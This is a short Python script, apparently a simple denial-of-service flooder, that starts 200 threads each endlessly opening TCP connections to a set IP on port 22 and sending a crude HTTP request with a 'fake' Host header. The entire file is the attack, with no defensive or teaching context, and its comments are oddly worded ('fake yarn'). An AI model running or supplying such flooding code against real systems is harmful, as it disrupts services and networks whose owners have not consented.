import threading
import socket


target = '192.168.1.1'  # selecting the target thread
port = 22               # selecting the destination port
fake_ip = '162.10.23.33'  # random selection of fake yarn


def attack():  # attack process over target ip and port

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),  # conversion actions

                 (target, port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()


for i in range(200):  # multithread operation

    thread = threading.Thread(target=attack)
    thread.start()
